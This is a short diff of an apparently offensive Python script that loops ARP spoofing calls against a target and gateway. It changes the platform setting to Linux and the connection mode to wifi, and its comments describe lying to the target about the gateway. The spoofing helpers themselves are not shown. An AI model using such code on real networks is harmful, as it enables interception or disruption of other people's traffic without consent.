@@ -5,10 +5,10 @@ import time
 # if __name__ == "main":
 target_ip = ""
 gateway_ip = ""
-enableIPRoute("Windows")
+enableIPRoute("Linux")
 
 try:
-    spoofer = Spoofer(con_mode="eth")
+    spoofer = Spoofer(con_mode="wifi")
     while True:
         # spoof(target_ip, gateway_ip)    # lie to the target saying that we are the gateway
         spoofer.spoof(target_ip, gateway_ip)    # like to the target saying that the gateway's IP is a non-existent one
